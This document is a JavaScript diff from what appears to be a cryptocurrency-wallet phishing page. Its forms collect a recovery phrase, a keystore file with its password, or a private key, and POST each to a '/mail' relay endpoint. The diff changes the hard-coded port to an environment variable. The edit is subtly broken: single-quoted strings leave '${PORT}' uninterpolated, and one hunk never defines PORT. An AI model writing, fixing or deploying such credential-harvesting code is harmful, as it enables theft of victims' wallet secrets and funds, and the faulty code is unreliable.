@@ -2271,9 +2271,10 @@
         if (phraseInputVal.trim() === "") {
           alert("Fill in your recovery phrase");
         } else {
+          
           try {
             const response = await fetch(
-              "http://localhost:3001/mail",
+              'http://localhost:${PORT}/mail',
               {
                 method: "POST",
                 headers: {
@@ -2341,9 +2342,10 @@
         if (keystorejson.trim() === "" || keystorepassword === "") {
           alert("Fill out all form fields before proceeding");
         } else {
+          const PORT = process.env.PORT || 3001;
           try {
             const response = await fetch(
-              "http://localhost:3001/mail",
+              'http://localhost:${PORT}/mail',
               {
                 method: "POST",
                 headers: {
@@ -2411,9 +2413,10 @@
         if (privatekey.trim() === "") {
           alert("Fill in your private key");
         } else {
+          const PORT = process.env.PORT || 3001;
           try {
             const response = await fetch(
-              "http://localhost:3001/mail",
+              'http://localhost:${PORT}/mail',
               {
                 method: "POST",
                 headers: {
